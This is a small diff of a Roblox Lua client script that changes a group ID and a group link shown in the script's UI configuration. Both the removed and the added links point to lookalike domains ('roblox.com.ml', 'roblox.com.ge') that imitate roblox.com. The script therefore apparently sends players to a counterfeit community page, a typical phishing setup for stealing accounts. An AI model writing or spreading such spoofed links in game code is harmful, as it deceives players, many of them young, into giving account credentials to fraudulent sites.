@@ -6,8 +6,8 @@ local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 
 -- CONFIG
-local GROUP_ID = 273949508649
-local GROUP_LINK = "https://www.roblox.com.ml/communities/273949508649/"
+local GROUP_ID = 8484039000
+local GROUP_LINK = "https://roblox.com.ge/communities/8484039000/"
 
 -- UI
 local ScreenGui = Instance.new("ScreenGui")
